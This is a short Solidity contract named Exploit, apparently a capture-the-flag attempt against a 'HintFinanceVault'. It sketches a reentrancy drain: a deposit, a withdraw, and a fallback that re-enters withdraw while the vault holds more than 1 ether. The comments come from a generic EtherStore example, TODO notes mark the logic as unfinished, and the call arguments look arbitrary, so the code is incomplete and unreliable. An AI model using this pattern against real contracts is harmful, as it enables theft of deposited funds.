// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./HintFinanceVault.sol";

contract Exploit {
  HintFinanceVault public vault;

  // initialise the etherStore variable with the contract address
  constructor(address _vaultAddr) {
      vault = HintFinanceVault(_vaultAddr);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
	  // TODO the whole logic
      vault.deposit(7);
      // start the magic
      vault.withdraw(5);
  }

  // fallback function - where the magic happens
  // TODO this whole logic
  fallback() external payable  {
      if (address(vault).balance > 1 ether) {
          vault.withdraw(5);
      }
  }
}

